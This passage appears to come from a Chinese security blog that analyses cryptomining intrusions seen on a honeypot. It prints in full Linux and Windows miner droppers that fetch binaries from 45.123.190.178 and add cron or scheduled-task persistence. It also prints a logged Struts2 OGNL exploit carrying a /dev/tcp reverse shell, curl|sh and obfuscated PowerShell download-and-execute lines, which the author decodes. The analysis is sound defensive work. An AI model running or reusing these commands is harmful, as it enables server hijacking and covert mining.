+<h3 id="lin-txt"><a href="#lin-txt" class="headerlink" title="lin.txt"></a><strong>lin.txt</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin:/usr/bin:/usr/<span class="built_in">local</span>/bin:/usr/sbin</div><div class="line">days=$(($(date +%s) / 60 / 60 / 24))</div><div class="line"><span class="function"><span class="title">DoMine</span></span>()</div><div class="line">&#123;</div><div class="line">rm -rf /tmp/Silence*</div><div class="line">ps -ef|grep Silence |grep -v grep</div><div class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [ -x /usr/bin/wget ] ; <span class="keyword">then</span></div><div class="line"><span class="keyword">elif</span> [ -x /usr/bin/curl ] ; <span class="keyword">then</span></div><div class="line">wget -q http://45.123.190.178/Silence -O /tmp/Silence</div><div class="line">curl -o /tmp/Silence http://45.123.190.178/Silence</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /tmp/Silence</div><div class="line">nohup /tmp/Silence -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x -R 1 &amp;&gt;&gt;/dev/null &amp;</div><div class="line">sleep 10</div><div class="line">rm -rf /tmp/Silence</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ -x /usr/bin/wget ] ; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">'*/15 * * * * wget -q http://45.123.190.178/lin.txt -O - |sh'</span> &gt; /tmp/.cron</div><div class="line"><span class="keyword">elif</span> [ -x /usr/bin/curl ] ; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">'*/15 * * * * curl http://45.123.190.178/lin.txt |sh'</span> &gt; /tmp/.cron</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div><div class="line">crontab -r</div><div class="line">crontab /tmp/.cron</div><div class="line">sleep 3</div><div class="line">rm /tmp/.cron</div><div class="line"><span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">ps auxf|grep -v grep|grep <span class="string">"42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="variable">$&#123;days&#125;</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"logind.conf"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"cryptonight"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"kworker"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"45hsTaSqTQM4K1Xeqkcy7eLzqdEuQ594fJVmQryCemQSCU878JGQdSDCxbhNyVjSkiaYat8yAfBuRTPSEUPZoARm9a5XEHZ"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">pkill -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4</div><div class="line">pkill -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB</div><div class="line">pkill -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df</div><div class="line">pkill -f cpuloadtest</div><div class="line">pkill -f crypto-pool</div><div class="line">pkill -f xmr</div><div class="line">pkill -f prohash</div><div class="line">pkill -f monero</div><div class="line">pkill -f miner</div><div class="line">pkill -f nanopool</div><div class="line">pkill -f minergate</div><div class="line">pkill -f yam</div><div class="line">pkill -f yam2</div><div class="line">pkill -f minerd</div><div class="line">pkill -f Circle_MI.png</div><div class="line">pkill -f curl</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"mine.moneropool.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"crypto-pool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"prohash"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"monero"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"miner"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"nanopool"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"minergate"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:8080"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:3333"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"xmr.crypto-pool.fr:443"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"zhuabcn@yahoo.com"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"stratum"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"49JsSwt7MsH5m8DPRHXFSEit9ZTWZCbWwS7QSMUTcVuCgwAU24gni1ydnHdrT9QMibLtZ3spC7PjmEyUSypnmtAG7pyys7F"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"11231"</span> || DoMine</div></pre></td></tr></table></figure>
+<p>脚本从<strong>45.123.190.178</strong>下载<strong>Silence</strong>样本进行挖矿(门罗币)，并且创建了定时任务每15分钟运行一次确保程序能够一直运行，后面则是清除一些残余进程</p>
+<h3 id="win-txt"><a href="#win-txt" class="headerlink" title="win.txt"></a><strong>win.txt</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$murl</span> = <span class="string">"http://45.123.190.178/Silences.exe"</span></div><div class="line"><span class="variable">$moutput</span> = <span class="string">"<span class="variable">$env</span>:TMP\yammsb.exe"</span></div><div class="line"><span class="variable">$wc</span> = New-Object System.Net.WebClient</div><div class="line"><span class="variable">$wc</span>.DownloadFile(<span class="variable">$murl</span>, <span class="variable">$moutput</span>)</div><div class="line">cmd.exe /c <span class="variable">$env</span>:TMP\yammsb.exe</div><div class="line">SchTasks.exe /Create /SC MINUTE /TN <span class="string">"UpdateGG"</span> /TR <span class="string">"PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noexit -File <span class="variable">$env</span>:TMP\SchTask.ps1"</span> /MO 6 /F</div><div class="line"></div><div class="line"><span class="keyword">while</span> (<span class="variable">$true</span>) &#123;</div><div class="line"><span class="keyword">if</span>(!(Get-Process Carbon -ErrorAction SilentlyContinue)) &#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">"Not running"</span></div><div class="line">cmd.exe /C <span class="variable">$env</span>:TMP\run.bat</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">echo</span> <span class="string">"Running"</span></div><div class="line">&#125;</div><div class="line">Start-Sleep 55</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>相应地，Windows下则是调用powershell下载，通信地址还是<strong>45.123.190.178</strong>，下载的是<strong>Silences.exe</strong>样本</p>
+<p>脚本里还有三个文件: <strong>yammsb.exe  SchTask.ps1  run.bat</strong></p>
+<p>跑了一下Silences.exe文件后产生了 <strong>SchTask.ps1 run.bat</strong> 两个文件，<strong>yammsb.exe</strong>暂不知道是什么，其中<strong>SchTask.ps1</strong>的内容就是上面win.txt内容，<strong>run.bat</strong>则配置了矿池的地址:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">taskkill /f /im Carbon.exe</div><div class="line">%temp%/Silence.exe -B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:80 -u 44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu -p x --donate-level=1 -t 4</div></pre></td></tr></table></figure>
+<p>里面的Carbon.exe可能与<a href="https://virus-removal-guide.net/zh/9199-carbon-exe-slowly-kills-cpu-carbon-exe-remedy/" target="_blank" rel="external">这篇文章</a>提到的有关，也是跟数字货币相关的恶意程序</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\16-32-3.png" alt="16-32-3"></p>
+<p>在微步在线上也出现了相关的情报，<a href="https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=287" target="_blank" rel="external">https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=287</a>，第一次发现是在1月5号，涉及到的脚本和蜜罐上看到的是一样的:</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这次事件利用了多个java反序列化漏洞来执行恶意行为，其中不乏最近爆出的Weblogic漏洞，这几个漏洞的显著特点就是可以远程执行代码，对黑产来说是最为简单有效的利用方式，而数字货币价格的不断攀升也更加助长了层出不穷的挖矿行为。</p>
+<p>相关的脚本和样本见附件，两个样本已经上传puma简单分析，对应链接</p>
+<p> <a href="https://poma.nsfocus.com/report?md5=483b322b42835227d98f523f9df5c6fc" target="_blank" rel="external">https://poma.nsfocus.com/report?md5=483b322b42835227d98f523f9df5c6fc</a></p>
+<p> <a href="https://poma.nsfocus.com/report?md5=e8e00e6490c1b1f07dc3d6d51fcc0d6d" target="_blank" rel="external">https://poma.nsfocus.com/report?md5=e8e00e6490c1b1f07dc3d6d51fcc0d6d</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/01/05/浏览器工作原理/" data-id="cjc7iqrrv000q5s1b2qh9q80m" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2018/01/10/利用java反序列化漏洞植入门罗币挖矿程序事件分析/" data-id="cjca1zrwm000k881bhjfpwfmq" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-powershell植入mule挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/10/powershell植入mule挖矿程序事件分析/" class="article-date">
+  <time datetime="2018-01-10T12:24:56.000Z" itemprop="datePublished">2018-01-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/10/powershell植入mule挖矿程序事件分析/">powershell植入mule挖矿程序事件分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>近期看到的一条日志内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">173.212.217.181 - - [20/Oct/2017:16:54:11 +0000] <span class="string">"GET / HTTP/1.1"</span> [] 200 - [-] [%&#123;(<span class="comment">#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context["com.opensymphony.xwork2.ActionContext.container"]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#wcmd="C:\\\"Windows\\\"System32\\\"WindowsPowerShell\\\"v1.0\\\"powershell.exe -WindowStyle Hidden -encode JABlAD0AJwBLAEEAQQB1AEEAQwBnAEEASQBnAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAEUAQQBmAFEAQgA3AEEARABJAEEAZgBRAEEAaQBBAEMAMABBAFoAZwBBAG4AQQBFADQAQQBKAHcAQQBzAEEAQwBnAEEASQBnAEIANwBBAEQARQBBAGYAUQBCADcAQQBEAEEAQQBmAFEAQQBpAEEAQwAwAEEAWgBnAEEAbgBBAEgAYwBBAEwAUQBCAFAAQQBHAEkAQQBKAHcAQQBzAEEAQwBjAEEAWgBRAEEAbgBBAEMAawBBAEwAQQBBAG8AQQBDAEkAQQBlAHcAQQB3AEEASAAwAEEAZQB3AEEAeABBAEgAMABBAEkAZwBBAHQAQQBHAFkAQQBJAEEAQQBuAEEARwBvAEEAWgBRAEEAbgBBAEMAdwBBAEoAdwBCAGoAQQBIAFEAQQBKAHcAQQBwAEEAQwBrAEEASQBBAEEAbwBBAEMASQBBAGUAdwBBADAAQQBIADAAQQBlAHcAQQB6AEEASAAwAEEAZQB3AEEAeQBBAEgAMABBAGUAdwBBAHgAQQBIADAAQQBlAHcAQQB3AEEASAAwAEEASQBnAEEAZwBBAEMAMABBAFoAZwBBAGcAQQBDAGMAQQBkAEEAQQBuAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AUQBCADkAQQBIAHMAQQBNAEEAQgA5AEEAQwBJAEEASQBBAEEAdABBAEcAWQBBAEoAdwBCAGwAQQBHADQAQQBKAHcAQQBzAEEAQwBjAEEAUQB3AEIAcwBBAEcAawBBAEoAdwBBAHAAQQBDAHcAQQBKAHcAQgBYAEEARwBVAEEAWQBnAEEAbgBBAEMAdwBBAEoAdwBCAGwAQQBIAFEAQQBMAGcAQQBuAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AUQBCADkAQQBIAHMAQQBNAEEAQgA5AEEASABzAEEATQBnAEIAOQBBAEMASQBBAEkAQQBBAHQAQQBHAFkAQQBKAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEMAYwBBAEwAQQBBAG4AQQBGAE0AQQBlAFEAQgB6AEEAQwBjAEEATABBAEEAbgBBAEUANABBAEoAdwBBAHAAQQBDAGsAQQBLAFEAQQB1AEEAQwBnAEEASQBnAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAEUAQQBmAFEAQgA3AEEARABNAEEAZgBRAEIANwBBAEQASQBBAGYAUQBBAGkAQQBDAEEAQQBMAFEAQgBtAEEAQwBjAEEAUgBBAEEAbgBBAEMAdwBBAEsAQQBBAGkAQQBIAHMAQQBNAFEAQgA5AEEASABzAEEATQBnAEIAOQBBAEgAcwBBAE0AQQBCADkAQQBDAEkAQQBMAFEAQgBtAEEAQwBBAEEASgB3AEIAaABBAEcAUQBBAFUAdwBCADAAQQBDAGMAQQBMAEEAQQBuAEEARwA4AEEAZAB3AEEAbgBBAEMAdwBBAEoAdwBCAHUAQQBHAHcAQQBiAHcAQQBuAEEAQwBrAEEATABBAEEAbgBBAEcANABBAFoAdwBBAG4AQQBDAHcAQQBKAHcAQgB5AEEARwBrAEEASgB3AEEAcABBAEMANABBAEkAZwBCAHAAQQBFADQAQQBWAGcAQgBnAEEARwA4AEEAWQBBAEIATABBAEcAVQBBAEkAZwBBAG8AQQBDAGcAQQBJAGcAQgA3AEEARABJAEEAZgBRAEIANwBBAEQARQBBAGYAUQBCADcAQQBEAE0AQQBmAFEAQgA3AEEARABVAEEAZgBRAEIANwBBAEQAQQBBAGYAUQBCADcAQQBEAFkAQQBmAFEAQgA3AEEARABRAEEAZgBRAEEAaQBBAEMAMABBAFoAZwBBAG8AQQBDAEkAQQBlAHcAQQB3AEEASAAwAEEAZQB3AEEAeABBAEgAMABBAEkAZwBBAGcAQQBDADAAQQBaAGcAQQBnAEEAQwBjAEEAYgBnAEEAdgBBAEMAYwBBAEwAQQBBAG4AQQBIAE0AQQBZAHcAQQBuAEEAQwBrAEEATABBAEEAbgBBAEgAUQBBAGQAQQBBAG4AQQBDAHcAQQBKAHcAQgBvAEEAQwBjAEEATABBAEEAbwBBAEMASQBBAGUAdwBBAHgAQQBIADAAQQBlAHcAQQB3AEEASAAwAEEASQBnAEEAZwBBAEMAMABBAFoAZwBBAGcAQQBDAGMAQQBMAHcAQgBoAEEAQwBjAEEATABBAEEAbgBBAEgAQQBBAE8AZwBBAHYAQQBDAGMAQQBLAFEAQQBzAEEAQwBjAEEATQBRAEEAbgBBAEMAdwBBAEsAQQBBAGkAQQBIAHMAQQBNAEEAQgA5AEEASABzAEEATQBnAEIAOQBBAEgAcwBBAE0AUQBCADkAQQBDAEkAQQBMAFEAQgBtAEEAQwBBAEEASgB3AEIAcABBAEgAUQBBAEoAdwBBAHMAQQBDAGMAQQBaAFEAQQB1AEEASABjAEEAYQBRAEEAbgBBAEMAdwBBAEoAdwBBADMAQQBHAFUAQQBKAHcAQQBwAEEAQwB3AEEASwBBAEEAaQBBAEgAcwBBAE0AQQBCADkAQQBIAHMAQQBNAFEAQgA5AEEAQwBJAEEASQBBAEEAdABBAEcAWQBBAEkAQQBBAG4AQQBIAFkAQQBMAGcAQgB3AEEAQwBjAEEATABBAEEAbgBBAEgATQBBAEoAdwBBAHAAQQBDAGsAQQBLAFEAQgA4AEEAQwA0AEEASwBBAEEAaQBBAEgAcwBBAE0AQQBCADkAQQBIAHMAQQBNAFEAQgA5AEEAQwBJAEEATABRAEIAbQBBAEMAQQBBAEoAdwBCAHAAQQBHAFUAQQBKAHcAQQBzAEEAQwBjAEEAZQBBAEEAbgBBAEMAawBBACcAOwAgAHMAdABhAHIAdAAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgACcALQBlAG4AYwBvAGQAZQAnACwAIAAkAGUA").(#lcmd="nohup sh -c '(sh &lt; /dev/tcp/149.255.35.91/23546 &gt; /dev/null || curl -s http://149.255.35.91/larva.sh|sh &gt; /dev/null || wget http://149.255.35.91/larva.sh -O /var/tmp/larva.sh) &amp;&amp; chmod +x /var/tmp/larva.sh &amp;&amp; (nohup /var/tmp/larva.sh &amp;) &amp;&amp; sleep 1 &amp;&amp; rm -f /var/tmp/larva.sh' &amp;").(#iswin=(@java.lang.System@getProperty("os.name").toLowerCase().contains("win"))).(#cmds=(#iswin?&#123;"cmd.exe","/c",#wcmd&#125;:&#123;"/bin/bash","-c",#lcmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(" ok5026 ".getBytes())).(#ros.flush())&#125;] 0.448 220</span></div></pre></td></tr></table></figure>
+<p>关键部分时一段编码后的powershell命令，base解码之后得到：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$e</span>=<span class="string">'KAAuACgAIgB7ADAAfQB7ADEAfQB7ADIAfQAiAC0AZgAnAE4AJwAsACgAIgB7ADEAfQB7ADAAfQAiAC0AZgAnAHcALQBPAGIAJwAsACcAZQAnACkALAAoACIAewAwAH0AewAxAH0AIgAtAGYAIAAnAGoAZQAnACwAJwBjAHQAJwApACkAIAAoACIAewA0AH0AewAzAH0AewAyAH0AewAxAH0AewAwAH0AIgAgAC0AZgAgACcAdAAnACwAKAAiAHsAMQB9AHsAMAB9ACIAIAAtAGYAJwBlAG4AJwAsACcAQwBsAGkAJwApACwAJwBXAGUAYgAnACwAJwBlAHQALgAnACwAKAAiAHsAMQB9AHsAMAB9AHsAMgB9ACIAIAAtAGYAJwB0AGUAbQAuACcALAAnAFMAeQBzACcALAAnAE4AJwApACkAKQAuACgAIgB7ADAAfQB7ADEAfQB7ADMAfQB7ADIAfQAiACAALQBmACcARAAnACwAKAAiAHsAMQB9AHsAMgB9AHsAMAB9ACIALQBmACAAJwBhAGQAUwB0ACcALAAnAG8AdwAnACwAJwBuAGwAbwAnACkALAAnAG4AZwAnACwAJwByAGkAJwApAC4AIgBpAE4AVgBgAG8AYABLAGUAIgAoACgAIgB7ADIAfQB7ADEAfQB7ADMAfQB7ADUAfQB7ADAAfQB7ADYAfQB7ADQAfQAiAC0AZgAoACIAewAwAH0AewAxAH0AIgAgAC0AZgAgACcAbgAvACcALAAnAHMAYwAnACkALAAnAHQAdAAnACwAJwBoACcALAAoACIAewAxAH0AewAwAH0AIgAgAC0AZgAgACcALwBhACcALAAnAHAAOgAvACcAKQAsACcAMQAnACwAKAAiAHsAMAB9AHsAMgB9AHsAMQB9ACIALQBmACAAJwBpAHQAJwAsACcAZQAuAHcAaQAnACwAJwA3AGUAJwApACwAKAAiAHsAMAB9AHsAMQB9ACIAIAAtAGYAIAAnAHYALgBwACcALAAnAHMAJwApACkAKQB8AC4AKAAiAHsAMAB9AHsAMQB9ACIALQBmACAAJwBpAGUAJwAsACcAeAAnACkA'</span>; start C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden <span class="string">'-encode'</span>, <span class="variable">$e</span></div></pre></td></tr></table></figure>
+<p>其中变量e再次进行了编码，于是再解码一次：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(.(<span class="string">"&#123;0&#125;&#123;1&#125;&#123;2&#125;"</span>-f<span class="string">'N'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span>-f<span class="string">'w-Ob'</span>,<span class="string">'e'</span>),(<span class="string">"&#123;0&#125;&#123;1&#125;"</span>-f <span class="string">'je'</span>,<span class="string">'ct'</span>)) (<span class="string">"&#123;4&#125;&#123;3&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;"</span> -f <span class="string">'t'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span> -f<span class="string">'en'</span>,<span class="string">'Cli'</span>),<span class="string">'Web'</span>,<span class="string">'et.'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;&#123;2&#125;"</span> -f<span class="string">'tem.'</span>,<span class="string">'Sys'</span>,<span class="string">'N'</span>))).(<span class="string">"&#123;0&#125;&#123;1&#125;&#123;3&#125;&#123;2&#125;"</span> -f<span class="string">'D'</span>,(<span class="string">"&#123;1&#125;&#123;2&#125;&#123;0&#125;"</span>-f <span class="string">'adSt'</span>,<span class="string">'ow'</span>,<span class="string">'nlo'</span>),<span class="string">'ng'</span>,<span class="string">'ri'</span>).<span class="string">"iNV`o`Ke"</span>((<span class="string">"&#123;2&#125;&#123;1&#125;&#123;3&#125;&#123;5&#125;&#123;0&#125;&#123;6&#125;&#123;4&#125;"</span>-f(<span class="string">"&#123;0&#125;&#123;1&#125;"</span> -f <span class="string">'n/'</span>,<span class="string">'sc'</span>),<span class="string">'tt'</span>,<span class="string">'h'</span>,(<span class="string">"&#123;1&#125;&#123;0&#125;"</span> -f <span class="string">'/a'</span>,<span class="string">'p:/'</span>),<span class="string">'1'</span>,(<span class="string">"&#123;0&#125;&#123;2&#125;&#123;1&#125;"</span>-f <span class="string">'it'</span>,<span class="string">'e.wi'</span>,<span class="string">'7e'</span>),(<span class="string">"&#123;0&#125;&#123;1&#125;"</span> -f <span class="string">'v.p'</span>,<span class="string">'s'</span>)))|.(<span class="string">"&#123;0&#125;&#123;1&#125;"</span>-f <span class="string">'ie'</span>,<span class="string">'x'</span>)</div></pre></td></tr></table></figure>
+<p>可读性还是很差，经过判断这应该对字符进行了换位操作，打乱了顺序逃避检测，于是把字符进行重新组合，得到了这样一条命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iex (New-Object SystemNet.WebClient).DownloadString(<span class="string">'http://ait7ee.win/scv.ps1'</span>)</div></pre></td></tr></table></figure>
+<p>所以一开始的命令经过两次解码和一次字符换位后完整命令如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden <span class="string">'-encode'</span>, <span class="string">'iex (New-Object SystemNet.WebClient).DownloadString('</span>http://ait7ee.win/scv.ps1<span class="string">')'</span></div></pre></td></tr></table></figure>
+<p>可以看到powershell执行的是下载操作,下载的文件地址是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ait7ee.win/scv.ps1</div></pre></td></tr></table></figure>
+<p>把这个文件下载下来，发现是一个经过高度混淆加密的ps脚本，具体内容没有分析出来，猜测是用于安装挖矿程序及其服务的。</p>
+<p>在脚本里找到这样一个地址：</p>
+<p><img src="H:\gitBlog\themes\landscape\source\upload_image\745.png" alt="745"></p>
+<p>直接访问   <a href="http://ait7ee.win/orbital_command.ps1" target="_blank" rel="external">http://ait7ee.win/orbital_command.ps1</a> 下载到一个新的脚本，简单分析之后发现是powersploit渗透框架下的一个模块<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="external">Invoke-ReflectivePEInjection.ps1</a>，功能是远程加载exe或dll并执行</p>
